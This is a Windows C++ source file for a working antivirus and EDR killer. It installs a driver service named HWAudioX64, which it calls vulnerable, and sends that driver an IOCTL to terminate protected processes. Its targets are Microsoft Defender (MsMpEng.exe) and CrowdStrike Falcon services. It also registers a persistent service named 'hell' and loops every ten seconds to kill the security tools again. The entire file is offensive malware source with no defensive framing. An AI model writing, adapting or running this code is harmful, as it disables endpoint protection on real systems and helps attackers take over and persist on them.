#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#define HWHACK_SERVICE_NAME  "HWAudioX64"
#define HWHACK_DISPLAY_NAME  "HWAudioX64 driver"
#define HWHACK_SYS_PATH      "C:\\HWAudioX64.sys"
#define HELL_SERVICE_NAME    "hell"
#define HELL_DISPLAY_NAME    "Hell Persistent Service"
#define HELL_EXE_PATH        "C:\\hell.exe"
#define IOCTL_TERMINATE_CODE 0x2248dc  
#define HWHACK_DEVICE_NAME   "\\\\.\\HWAudioX64"

// ----------------------------------------------------------------------------
// SCM helper functions
// ----------------------------------------------------------------------------
SC_HANDLE OpenSCManagerHandle() {
    return OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
}

bool CreateOrOpenService(
    SC_HANDLE scm,
    const char* svcName,
    const char* displayName,
    const char* binPath,
    DWORD       serviceType,
    const char* dependencies 
) {
    
    SC_HANDLE svc = OpenServiceA(scm, svcName, SERVICE_START);
    if (svc) {
        CloseServiceHandle(svc);
        return true;
    }
    
    svc = CreateServiceA(
        scm,
        svcName,
        displayName,
        SERVICE_START | SERVICE_STOP,
        serviceType,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        nullptr,
        nullptr,
        dependencies,
        nullptr,
        nullptr
    );
    if (!svc) {
        std::cerr << "[-] CreateService(" << svcName << ") failed: " 
                  << GetLastError() << "\n";
        return false;
    }
    CloseServiceHandle(svc);
    return true;
}

bool StartServiceIfNotRunning(const char* svcName) {
    SC_HANDLE scm = OpenSCManagerHandle();
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceA(scm, svcName, SERVICE_START);
    if (!svc) {
        std::cerr << "[-] OpenService(" << svcName << ") failed: " 
                  << GetLastError() << "\n";
        CloseServiceHandle(scm);
        return false;
    }

    if (!StartServiceA(svc, 0, nullptr)
        && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
        std::cerr << "[-] StartService(" << svcName << ") failed: " 
                  << GetLastError() << "\n";
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        return false;
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    std::cout << "[+] Service '" << svcName << "' is running.\n";
    return true;
}

// ----------------------------------------------------------------------------
// Find and kill protected processes via the vulnerable driver
// ----------------------------------------------------------------------------
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                DWORD pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return pid;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

void KillWithVulnDriver(DWORD pid) {
    HANDLE hDevice = CreateFileA(
        HWHACK_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open device " << HWHACK_DEVICE_NAME 
                  << " (Error " << GetLastError() << ")\n";
        return;
    }

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(
            hDevice,
            IOCTL_TERMINATE_CODE,
            &pid, sizeof(pid),
            nullptr, 0,
            &bytesReturned,
            nullptr
        )) {
        std::cerr << "[-] DeviceIoControl failed for PID=" 
                  << pid << " (Error " << GetLastError() << ")\n";
    } else {
        std::cout << "[+] PID " << pid << " terminated via driver.\n";
    }

    CloseHandle(hDevice);
}

void MonitorAndKillLoop() {
    std::vector<std::wstring> targets = {
        L"MsMpEng.exe",
        L"CSFalconService.exe",
        L"CSFalconContainer.exe"
    };

    while (true) {
        for (const auto& name : targets) {
            DWORD pid = FindProcessId(name);
            if (pid) {
                std::wcout << L"[+] Detected " << name 
                           << L" with PID=" << pid << L"; killing...\n";
                KillWithVulnDriver(pid);
            }
        }
        
        Sleep(10 * 1000);
    }
}

// ----------------------------------------------------------------------------
// Main flow
// ----------------------------------------------------------------------------
int main() {
    //Install and start the vulnerable driver
    {
        SC_HANDLE scm = OpenSCManagerHandle();
        if (!scm) return 1;

        if (!CreateOrOpenService(
                scm,
                HWHACK_SERVICE_NAME,
                HWHACK_DISPLAY_NAME,
                HWHACK_SYS_PATH,
                SERVICE_KERNEL_DRIVER,
                nullptr  
            )) {
            CloseServiceHandle(scm);
            return 1;
        }
        CloseServiceHandle(scm);

        if (!StartServiceIfNotRunning(HWHACK_SERVICE_NAME))
            return 1;
    }

    //Immediately kill any running instances once
    {
        std::vector<std::wstring> initialTargets = {
            L"MsMpEng.exe",
            L"CSFalconService.exe",
            L"CSFalconContainer.exe"
        };
        for (const auto& name : initialTargets) {
            DWORD pid = FindProcessId(name);
            if (pid) {
                std::wcout << L"[+] Found " << name 
                           << L" (PID=" << pid << L"); killing...\n";
                KillWithVulnDriver(pid);
            }
        }
    }

    //Install and start your "hell" service (dependent on the driver)
    {
        
        const char dependencies[] = HWHACK_SERVICE_NAME "\0\0";
        SC_HANDLE scm = OpenSCManagerHandle();
        if (!scm) return 1;

        if (!CreateOrOpenService(
                scm,
                HELL_SERVICE_NAME,
                HELL_DISPLAY_NAME,
                HELL_EXE_PATH,
                SERVICE_WIN32_OWN_PROCESS,
                dependencies
            )) {
            CloseServiceHandle(scm);
            return 1;
        }
        CloseServiceHandle(scm);

        if (!StartServiceIfNotRunning(HELL_SERVICE_NAME))
            return 1;
    }

    std::cout << ">> Initial setup complete. Entering monitoring loop...\n";

    // 4) Continuously monitor for Defender/CrowdStrike and kill
    MonitorAndKillLoop();

    return 0;
}
